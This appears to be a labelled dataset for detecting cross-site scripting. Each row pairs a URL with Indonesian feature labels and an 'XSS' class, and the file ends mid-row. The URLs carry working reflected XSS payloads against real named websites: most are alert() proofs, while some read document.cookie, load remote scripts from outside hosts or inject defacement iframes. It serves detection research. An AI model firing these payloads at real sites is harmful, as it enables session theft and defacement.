method;XSS\r\nhttp://www.jouezetgagnez.net/index.php?email=XSS%40gmail.com&nom=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&prenom=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&civilite=H&zipcode=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&day_birthdate=16&month_birthdate=3&year_birthdate=1952&newsletter=on&x=169&y=26;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.jwcoca.qld.gov.au/02_cal/index.asp?varKeyword=%22%3E%3Cscript%3Ealert%28%2FXSS%20by%2003storic%2F%29%3C%2Fscript%3E&imageField.x=11&imageField.y=5;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.kaspersky.cl/certificaciones/?year=>\"\"><ScRiPt%20%0a%0d>alert(/XSS%20By%20TurKPoweR/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR</h1></marquee>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.kat.ph/help/search/?s=XSS\"\"><script>alert('XSS By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.kcna.kp/kcna.user.home.photo.retrievePhotoList.kcmsf?article_code=&article_type_list=&new s_type_code=&show_what=&mediaCode=\\'\"\");('&features_lang=1&exploit_lang=--C/script%3E%3b%28%27&features_lang=1&exploit_lang=--\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.keywordspy.com.br/overview/domain.aspx?q=DcbBizz.com/out.php?id=%22%3E%3Cscript%3Ealert(%27illuz1oN@r00tDefaced.net%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.kicker.de/community/login/?nickname=%22%20style=background:url(http://data.xssed.org/images/xssed_logo.gif);width:247px;height:96px%20onmouseover=alert(document.cookie)%20%22\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.kkh-allianz.de/index.cfm?q=\"\";alert(document.cookie)//&pageid=188&cof=FORID:11;NB:1\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.kongregate.com/games/armorgames/%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.laudaair.com/site/typo3conf/ext/og_promo/res/xmas.swf?clicktag=javascript:window.open(%27http://www.xssed.com%27);%20alert(%27XSSED%20by%20Viper.aT%27)\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.lds.org/placestovisit/search/1,10403,1603-1-1,00.html?search=%22+onmouseover%3D%22alert%281%29;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.lefigaro.fr/palmares-lycees/recherche.php?etab=%22%3E%3Cscript%3Ealert(1337)%3B%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+WARVEBlank atau CTOR+%3D)%3C%2Fh1%3E%3C%2Fmarquee%3E&comm=%22%3E%3Cscript%3Ealert(1337)%3B%3C%2Fscript%3E%3Cmarquee%3E%3Ch1%3EXSS+BY+WARVEBlank atau CTOR+%3D)%3C%2Fh1%3E%3C%2Fmarquee%3E&x=0&y=0&type=general;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.lgsd.lu/raro/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.lsi.com/DistributionSystem/User/Registration.aspx?pid=%22%20onMouseOver=alert(String.fromCharCode(120,115,115))%20fake=%22 [Mouse-over 'Register' link on top right];Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.lukoil.ge/index.php/%22onmouseover=prompt%28980237%29%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.madeinitaly.gov.it/mibd/find_italian_partner_direBlank atau CTOry.php?Testo=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E&Tipologia=una&Dove=inTutte&Attivita=;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.manchesterproducts.com/search_detail.php?header_search_box=%2F%22%3E%3Cscript%3Ealert%28%27Xss+By+Atm0n3r%27%29%3C%2Fscript%3E&header_categor y_select=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.maquis-art.com/shop/index.php?page=1&objet_recherche=/\"\">\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.marchantbrothers.co.uk/mix.php?id=-61%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mazagrandimmobilier.com/index.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.mediametrie.com/recherche.php?do=search&keywords=%3Cscript%3Ealert%28%22XSS.by.03storic%22%29%3C%2Fscript%3E%3Ciframe+src%3D%22http%3A%2F%2Fvuln.xssed.net%2Fxssed.gif%22%3E&where=1&x=0&y=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.megavideo.com/?c=profile&user=%22onfocus=alert%281%29%20/%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.melih.com/wp-content/themes/melih-new/video.php?f=%22%20onmouseover=alert(String.fromCharCode(88,83,83))%20bad=%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.mercadolibre.cl/chile/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.ar/argentina/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.co/colombia/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.do/dominicana/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.ec/ecuador/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.mx/mexico/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.pa/panama/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.pe/peru/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolibre.com.uy/uruguay/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolivre.com.br/brasil/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolivre.com.pt/portugal/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mercadolivre.pt/portugal/ml/l_user.main?as_filtro_id=CERTIFIED_USR&as_nickname=%A0&as_pcia_id=%3E%22%3E%3CScRiPt%3Ealert%28%27XSS%27%29;%3C/scRipt%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.mhp.net/search.php?q=%3Cscript%3E+alert%28%2FVisit%20HaxInTheBox.BlogSpot.com%20For%20More%20XSS%2F%29%3B+%3C%2Fscript%3E&submit=Go;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mikrotik.com/shopping.php?sect=%22%3E%3Cscript%3Ealert%28%27v30sharp%27%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.milw0rm.nl/uc501/exploit.php?id=30;Kurang dari 54;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.mke.go.kr/common/search/wnsearch.jsp?collection=all&startCount_info=0&startCount=0&cate=0&query=%22%3E%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mmorpg.com/account_tools.cfm?email=\"\" onmouseover=\"\"alert(document.cookie)\"\" onfocus=\"\"alert(document.cookie)\"\"&nbAnswer=42\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://www.mtv.com/music/artists/browse.jhtml?chars=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.munyie.com/search.php?keywords=%3Cscript%3Ealert%28%22XSSED%20By%20./r14nul%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.myspace.com/stillstandingthemovement/videos/extern.php?url=%22%3E%3CScript%3Ealert%28/1/% 29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.mysql.ru/webboard/search.html?text=\"\"><script>alert(String.fromCharCode(88,83,83))</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.n9.fr/index.php?id=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.narbonne.fr/search/google/%252F%22%3E%3Cscript%20type%3D%22text/javascript%22%20src%3D%22http%3A/%252Fyourjavascript.com/27544112151/xss.atmon3r.js%22%3E%3C/script%3E?query=%2F%22%3E%3Cscript%20type%3D%22text%2Fjavascript%22%20src%3D%22http%3A%2F%2Fyourjavascript.com%2F27544112151%2Fxss.atmon3r.js%22%3E%3C%2Fscript%3E&cx=013547730913211493630%3Aj69brl4dbyu&cof=FORID%3A11&sitesearch=&hl=fr&lr=lang_fr;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.nationwide2u.com/v2/cgi-bin/trackbe.cfm?resubmit=1&CNNO=\"\"><script>alert(0)</script><\"\"\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.nba.com/media/nba_asb06_750x26_v03.swf?clicktag=javascript:alert(document.location);Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://www.nearlynewborn.com/store/error.asp?msg=<iframe src=\"\"http://xssed.com\"\">\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.newnet.ge/avtandil_iashvili.php?lang_id=%22%20onmouseover%3dprompt%28965176%29%20bad%3d%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.nexans.in/Corporate/2007/fttx_v2_2.swf?clickTAG=javascript:alert(\"\"XSSED\"\");\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.nooreg.no/Index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://www.npsinternational.com/product_detail.php?catid=1&pid=\"\"><script>alert(1)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.nrc.gov/public-involve/public-meetings/index.cfm?fuseaction=Search.Detail&NS=0&MC=%3Ch1%3Ehacked%20by:%20WWW.ALPACAHACK.COM%3C/h1%3E%3Ciframe%20src=%22http://XSSed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.onradio.gr/player.php?id=229%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.openmedia.fr/listing.php?ancloca=/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://www.opera-guide.ch/index.php?uilang=en%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.optilian.com/?part=accueil%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.orangecountync.gov/Email/MsgForm.asp?email=dstancil&domain=co.orange.nc.us&name=David+Stancil%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://www.ox.ac.uk/applications/contact_search/index.rm?site=%3Ch1%3Ehacked%20by%20ALPACAHACK.COM%3C/h1%3E%3Ciframe%20src=%22http://XSSed.com/%22%3E%3C!--;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://www.paid-to-promote.net/member/signup.php?r=%22%3E%3Cscript%3Ealert%28%22Xssed%20By%20Talented%20Fool%22%29;%3C/script%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML 